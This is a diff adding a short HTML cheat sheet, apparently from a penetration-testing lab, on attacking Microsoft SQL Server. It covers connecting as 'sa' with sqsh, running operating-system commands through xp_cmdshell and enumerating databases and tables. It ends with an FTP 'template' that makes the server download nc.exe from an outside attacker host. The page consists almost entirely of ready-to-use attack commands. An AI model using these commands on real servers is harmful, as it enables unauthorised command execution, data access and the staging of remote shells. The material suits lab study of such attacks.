@@ -1,0 +1,45 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Manual</title>
+</head><body><b><span style="font-size: 12pt">MS-SQL shell</span><br/>
+</b><br/>
+<b>How to connect<br/>
+</b><br/>
+define host in /etc/freetds/freetds.conf<br/>
+add following<br/>
+<br/>
+<tt>[myserver]<br/>
+host = 10.11.1.31<br/>
+port = 1433<br/>
+</tt><tt>tds version = 8.0</tt><br/>
+<br/>
+Connect<br/>
+<tt>sqsh -S myserver -U sa -P passwd -m vert</tt><br/>
+<br/>
+Execute command<br/>
+<tt>exec xp_cmdshell 'whoami'<br/>
+</tt><tt>go (needed after every statement!)</tt><br/>
+<br/>
+List databases<b><br/>
+</b><tt>EXEC sp_databases<br/>
+</tt><tt>go</tt><br/>
+<br/>
+Select database<b><br/>
+</b><tt>use db_name<br/>
+</tt><tt>go</tt><br/>
+<br/>
+List tables<br/>
+<tt>SELECT name FROM sysobjects WHERE xtype = 'U'<br/>
+</tt><tt>go</tt><br/>
+<br/>
+<br/>
+<b>Download file through FTP template<br/>
+</b><tt><br/>
+exec xp_cmdshell 'echo open 10.11.0.143 21 &gt; ftp.txt'<br/>
+exec xp_cmdshell 'echo USER offsec passwd &gt;&gt; ftp.txt'<br/>
+exec xp_cmdshell 'echo bin &gt;&gt; ftp.txt'<br/>
+exec xp_cmdshell 'echo GET nc.exe &gt;&gt; ftp.txt'<br/>
+exec xp_cmdshell 'echo bye &gt;&gt; ftp.txt'<br/>
+exec xp_cmdshell 'ftp -v -n -i -s:ftp.txt'<br/>
+</tt></body></html>
